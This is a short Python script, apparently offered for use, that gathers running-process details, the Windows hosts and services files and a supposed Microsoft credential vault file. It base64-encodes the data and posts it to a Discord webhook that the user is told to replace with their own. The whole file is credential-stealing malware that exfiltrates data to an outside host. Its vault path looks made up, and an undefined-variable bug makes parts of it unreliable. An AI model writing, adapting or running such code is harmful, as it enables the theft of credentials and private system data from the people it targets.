import json
import os
import psutil
import requests
import base64
# Replace this without your own Server webhhok
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1234567890123456/AkzJELDIE98h7DID_TOKEN_9hOJdwBytZsG9"
def get_processes():
    processes = []
    for proc in psutil.process_iter():
        try:
            pinfo = proc.as_dict(attrs=['pid', 'name', 'exe'])
            processes.append(pinfo)
        except Exception as e:
            print(f"An error occurred while getting process info: {e}")
    return processes

def read_file(path):
    with open(path, 'r') as file:
        return file.read()
def send_data_to_webhook(data):
    try:
        
        json_object = json.dumps(data, indent=4, sort_keys=True)
       
        payload = base64.b64encode(json_object.encode('utf-8'))
        
        response = requests.post(
            DISCORD_WEBHOOK_URL, data=payload.decode('utf-8'))
        response.raise_for_status()
        print("Data sent successfully.")
    except Exception as e:
        print(f"An error occurred while sending data to the webhook: {e}")

def main():

    process_list = get_processes()
    hosts_file = read_file(r"C:\Windows\System32\drivers\etc\hosts")
    services_file = read_file(r"C:\Windows\System32\drivers\etc\services")

    try:
    
        credentials_vault = read_file(f"{os.getenv('APPDATA')}\\Microsoft\\SignIn\\9ca4f0-354-43b-ba9c-a787d4aca2\\Roaming\\microsoftcredential.vault")
    except FileNotFoundError:
        
        print("microsoft credential vault not found.")

    data = {
        "processes": process_list,
        "hosts_file": hosts_file,
        "services_file": services_file,
        "credentials_vault": credentials_vault
    }


    send_data_to_webhook(data)

if __name__ == "__main__":
    main()